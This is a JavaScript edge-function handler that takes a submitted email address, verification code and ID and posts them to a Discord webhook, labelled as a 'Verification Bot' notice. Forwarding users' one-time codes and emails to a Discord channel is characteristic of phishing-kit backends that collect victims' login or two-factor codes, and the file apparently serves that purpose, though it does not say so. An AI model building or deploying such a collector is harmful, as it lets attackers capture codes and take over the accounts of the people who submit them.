export const config = { runtime: 'edge' }

export default async function handler(req) {
  if (req.method !== 'POST') {
    return new Response(
      JSON.stringify({ error: 'Method not allowed' }),
      { status: 405, headers: { 'Content-Type': 'application/json' } }
    )
  }

  const webhookUrl = process.env.DISCORD_WEBHOOK_CODE
  if (!webhookUrl) {
    return new Response(
      JSON.stringify({ error: 'Webhook URL missing' }),
      { status: 500, headers: { 'Content-Type': 'application/json' } }
    )
  }

  try {
    const body = await req.json()
    const { email, code, id } = body

    const payload = {
      username: '🔐 Verification Bot',
      avatar_url: 'https://cdn-icons-png.flaticon.com/512/3135/3135715.png',
      embeds: [{
        title: '✅ Email Verification Completed',
        color: 0x2ecc71,
        fields: [
          { name: '🔖 Verification ID', value: `\`${id}\``, inline: true },
          { name: '📧 Email', value: `\`${email}\``, inline: true },
          { name: '🔢 Code Used', value: `\`${code}\``, inline: true },
          { name: '📅 Date', value: new Date().toLocaleString('es-ES'), inline: false }
        ],
        footer: { text: 'Verification System' },
        timestamp: new Date().toISOString()
      }]
    }

    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    })

    if (!response.ok) {
      throw new Error('Discord rejected the request')
    }

    return new Response(
      JSON.stringify({ success: true }),
      { status: 200, headers: { 'Content-Type': 'application/json' } }
    )
  } catch (error) {
    console.error('Code webhook error:', error)
    return new Response(
      JSON.stringify({ error: error.message }),
      { status: 500, headers: { 'Content-Type': 'application/json' } }
    )
  }
}
